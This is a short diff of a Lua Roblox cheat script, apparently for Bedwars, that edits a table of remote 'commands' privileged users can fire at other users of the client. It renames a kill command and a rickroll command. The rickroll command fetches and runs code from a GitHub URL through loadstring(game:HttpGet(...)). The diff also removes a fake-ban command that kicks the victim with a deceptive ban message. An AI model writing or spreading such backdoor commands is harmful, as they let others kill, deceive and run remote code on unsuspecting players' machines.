@@ -10665,7 +10665,7 @@ function CanAttackUser(u)
 	return getLplrType() >= userType
 end
 local commands = {
-	[";kill default"] = function()
+	[";bye default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
@@ -10690,17 +10690,9 @@ local commands = {
 			end
 		end
 	end,
-	[";rickroll default"] = function()
+	[";rick default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
-		end
-	end,
-	[";ban default"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			task.spawn(function()
-				lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-			end)
-			bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 		end
 	end,
 	[";byfron default"] = function()
